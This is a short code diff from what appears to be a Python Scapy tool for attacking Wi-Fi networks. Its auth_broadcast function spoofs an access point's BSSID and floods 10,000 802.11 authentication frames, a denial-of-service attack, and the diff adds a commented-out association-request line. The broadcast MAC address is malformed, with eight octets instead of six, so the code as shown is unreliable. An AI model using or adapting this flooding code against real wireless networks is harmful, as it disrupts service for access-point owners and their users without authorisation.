@@ -15,6 +15,7 @@ def auth_broadcast(iface: str, bssid: str):
   print('this is auth')
   dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
   frame = RadioTap()/dot11/Dot11Auth()
+  # asso = Dot11AssoReq(cap=0x1100, listen_interval=0x00a)
   sendp(frame, iface=iface, count=10000, inter=0.100)
 
 def auth_station(iface: str, bssid: str, target_mac: str):
